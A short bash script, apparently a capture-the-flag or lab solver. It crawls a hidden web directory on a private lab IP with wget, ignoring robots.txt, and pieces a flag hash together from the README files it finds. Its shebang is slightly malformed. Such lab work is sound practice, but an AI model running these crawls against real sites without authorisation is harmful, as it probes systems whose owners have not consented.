#!bin/bash

# 192.168.1.109
ip="192.168.1.109"

mkdir ./scraped ; cd ./scraped
wget -q -np -r -A "README*" -nd -l 4 -e robots=off http://${ip}/.hidden/
tmp=`ls | grep README | wc -l`
index=$(($tmp-1))
readme="README."
while [ $index != 0 ]
do
	file=$readme$index
	str=`cat $file | grep 2`
	printf "%s" $str
	index=$(($index-1))
done
str=`cat "README" | grep -E [0-9a-f]{64}`
printf "%s" $str
# cd ../ ; rm -rf ./scraped